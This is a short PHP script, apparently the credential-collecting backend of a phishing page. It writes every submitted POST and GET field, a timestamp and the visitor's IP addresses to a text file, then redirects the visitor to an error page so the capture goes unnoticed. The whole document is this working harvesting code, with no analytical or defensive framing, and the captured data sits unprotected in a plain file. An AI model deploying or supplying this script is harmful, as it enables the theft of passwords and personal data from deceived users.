<?php
$file = 'POST.txt'; 
$arr= $_POST; 
$fp = fopen($file, 'a') or die('error occured');  
fwrite($fp, "-------------------------\n") or die('error occured');
$mydate=getdate(date("U"));
fwrite($fp, "$mydate[year]/$mydate[mon]/$mydate[mday] - $mydate[hours]:$mydate[minutes]:$mydate[seconds]\n") or die('error occured');
fwrite($fp, "( ".$_SERVER['HTTP_X_FORWARDED_FOR']." ) ( ".$_SERVER['REMOTE_ADDR']." )\n") or die('error occured');
foreach ($arr as $key => $value) { 
    $toFile = "Key: $key; Value: $value \n"; 
    fwrite($fp, "$toFile") or die('error occured');  
} 
$arr= $_GET; 
foreach ($arr as $key => $value) { 
    $toFile = "Key: $key; Value: $value \n"; 
    fwrite($fp, "$toFile") or die('error occured');  
} 
fclose($fp); 
header( 'Location: error.html' ) ;
?>
